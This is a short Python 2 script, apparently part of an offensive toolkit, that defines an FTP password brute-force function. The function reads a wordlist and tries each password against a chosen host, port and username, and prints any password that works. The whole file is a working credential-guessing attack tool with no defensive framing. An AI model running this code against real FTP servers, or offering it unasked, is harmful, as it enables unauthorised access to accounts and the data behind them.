from ftplib import FTP
from time import sleep
import sys

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

def ftpBruteforce(address, username, wordlist, delay, port):
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            ftp = FTP()
            ftp.connect(address, port)
            ftp.login(username, password)
            ftp.retrlines('LIST')
            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            ftp.quit()
        except:
             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
             sleep(delay)
